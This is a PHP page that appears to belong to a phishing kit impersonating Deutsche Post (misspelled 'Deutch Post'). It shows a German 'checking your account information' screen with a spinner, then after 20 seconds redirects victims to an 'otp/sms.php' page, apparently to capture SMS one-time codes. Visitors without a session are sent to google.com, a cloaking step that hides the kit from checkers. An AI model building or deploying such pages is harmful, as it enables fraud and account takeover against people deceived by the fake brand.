<?php
session_start();
if (isset($_SESSION["username"])) {



?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v4.0.1">
    <title>Wird geladen - Deutch Post</title>


<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>





    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
    </style>




    <!-- Custom styles for this template -->
      <link href="../file/css/style.css" rel="stylesheet">

  </head>
  <body>
    <header>

  <div class="menu navbar navbar-dark shadow-sm">
    <div class="container d-flex justify-content-between">
      <a href="#" class="navbar-brand d-flex align-items-center">
        <img src="../file/img/logo.png" width="300px" height="54px">
      </a>
    </div>
  </div>
</header>

<main role="main">

  <section class="jumbotron">
    <div class="container">
      
      <form>
          <div class="row">

                            <div class="col-md-12">
                      <div class="card">
                          <div class="card-header">
                              <div class="row">
                                  <div class="col-md-12"> <span>ÜBERPRÜFUNG DES AUTHENTIKATIONSCODES</span> </div>
                              </div>
                          </div>
                                <div class="card-body">
                                                  

                                 
                                <div class="text-center">
                                <h3>Wir überprüfen Ihre Kontoinformationen</h3>
                                <h5>Warten Sie bitte einen Moment...</h5>
								  <div class="spinner-border" role="status">
								    <span class="sr-only">Wird geladen...</span>
								  </div>
								</div>
                              
                                </div>




                  
                      </div>
                  </div>

          </div>
    </form>


    </div>
  </section>



</main>

<footer class="text-muted">
  <div class="container">
    <p class="float-right">
      <a href="#">Back to top</a>
    </p>
  
  </div>
</footer>
<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>

<script type="text/javascript">
    $(document).ready(function () {
    // Handler for .ready() called.
    window.setTimeout(function () {
        location.href = "../otp/sms.php";
    }, 20000);
});
    </script




</html>
    <?php
}else {
HEADER("Location: https://google.com");

}
?>